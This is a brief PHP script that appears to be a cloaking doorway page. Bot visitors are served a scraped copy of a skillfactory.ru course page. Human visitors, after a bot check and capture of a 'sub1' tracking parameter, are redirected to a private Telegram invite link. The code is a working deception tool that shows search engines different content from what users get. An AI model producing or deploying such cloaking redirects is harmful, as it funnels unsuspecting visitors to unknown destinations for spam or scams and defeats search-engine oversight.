<?php include("27756-15GPcN.php");?>
<?php if(\BotDetecter::isBot()){ ?>

  <?php
	$url = "https://skillfactory.ru/mobile-developer";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$response = curl_exec($ch);
	curl_close($ch);
	echo $response;
	?>

<?php } ?>
<?php if(\BotDetecter::isNotBot()){ ?>
<?php
$res = \BotDetecter::getResponce();
$cid = isset($res['cid']) ? $res['cid'] : null;
?>
<?php
  $sub1 = !empty($_GET['sub1']) ? $_GET['sub1'] : "";

  header('Location: https://t.me/+51xpVTBy61M0YzBi')
?>
<?php } ?>
